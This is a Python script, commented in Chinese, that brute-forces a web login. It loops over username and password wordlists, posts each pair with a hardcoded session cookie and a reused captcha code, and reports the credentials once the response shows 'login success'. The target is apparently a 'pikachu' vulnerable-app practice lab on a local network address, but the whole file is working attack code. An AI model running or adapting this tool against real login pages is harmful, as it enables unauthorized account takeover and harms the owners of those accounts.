'''
需要添加Cookie。验证码可多次使用
'''
import re
import requests

def burteforce_client(url):
    with open('C:/Users/MZS/PycharmProjects/Web_Vulnerablility/burteforce/user.txt', 'r') as user:
        for username in user:
            with open('C:/Users/MZS/PycharmProjects/Web_Vulnerablility/burteforce/口令', 'r') as passwd:
                for password in passwd:
                    # url = "http://192.168.1.192:8086/pikachu/vul/burteforce/bf_client.php"
                    header = {
                        'Cookie': 'PHPSESSID=5r1bk8gn8nnipo6jnoaipg2tm3; security=impossible',
                        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36'
                    }
                    data = {
                        'username': username.strip(),
                        'password': password.strip(),
                        'submit': 'Login',
                        'vcode': 'OJEEP'  # 根据实际情况改动
                    }
                    res = requests.post(url=url, headers=header, data=data)
                    if re.findall('login success', res.text) and url == 'http://192.168.1.192:8086/pikachu/vul/burteforce/bf_client.php':
                        print('破解成功')
                        print("用户名是：", username.strip())
                        print("密码是：", password.strip())
                        return True

    return False
